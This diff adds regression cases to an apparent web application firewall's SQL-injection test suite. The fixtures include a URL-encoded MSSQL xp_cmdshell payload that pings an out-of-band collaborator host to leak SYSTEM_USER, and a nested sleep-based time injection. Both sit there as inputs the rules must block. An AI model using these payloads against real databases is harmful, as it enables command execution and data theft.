@@ -219,4 +219,38 @@ pub static CASES: &[Case] = &[
         rules: &[],
         desc: "AND-tautology narrowing trap (PL2): 'word and word=word' must not fire",
     },
+    // ── 10b-bis: MSSQL OS-exec stored procedure (xp_cmdshell) ────────────────────
+    // WIRE (pcap bypass-new.txt): gotestwaf sql-injection stacked+commented
+    // `…EXEC Master.dbo.xp_cmdshell @c…`. Was sub-threshold (only sqli-cast-convert
+    // Notice=2); the invocation-anchored proc rule (Critical) now blocks it.
+    Case {
+        id: "sqli-mssql-xp-cmdshell-wire",
+        module: Module::Sqli,
+        field: Field::RawQuery("1ffc8a206a=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3"),
+        min_pl: 1,
+        expect: Expect::Triggers,
+        rules: &["sqli-mssql-dangerous-proc"],
+        desc: "WIRE: MSSQL `EXEC Master.dbo.xp_cmdshell @c` (stacked+commented) — 10b-bis, \
+               invocation-anchored proc rule",
+    },
+    Case {
+        id: "sqli-benign-xp-cmdshell-prose",
+        module: Module::Sqli,
+        field: Field::Query { name: "q", value: "how to disable xp_cmdshell on SQL Server" },
+        min_pl: 1,
+        expect: Expect::Clean,
+        rules: &[],
+        desc: "benign prose NAMING the proc (no `.`/`;`/`(`/`exec` qualifier) — invocation anchor keeps it Clean (FP guard)",
+    },
+    // Lock (probe-confirmed already CAUGHT in current code, score 6 — the wire 200 was a
+    // stale binary): nested `select(sleep(15))` time-based SQLi stays blocked.
+    Case {
+        id: "sqli-time-nested-sleep-wire",
+        module: Module::Sqli,
+        field: Field::RawQuery("01a0b94d74=%28select%280%29from%28select%28sleep%2815%29%29%29v%29%2F%2A%27+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%27%2522+%28select%280%29from%28select%28sleep%2815%29%29%29v%29+%2522%2A%2F"),
+        min_pl: 1,
+        expect: Expect::Triggers,
+        rules: &["sqli-time-based"],
+        desc: "WIRE lock: nested `(select(0)from(select(sleep(15)))v)` — sqli-time-based already catches it (regression guard)",
+    },
 ];
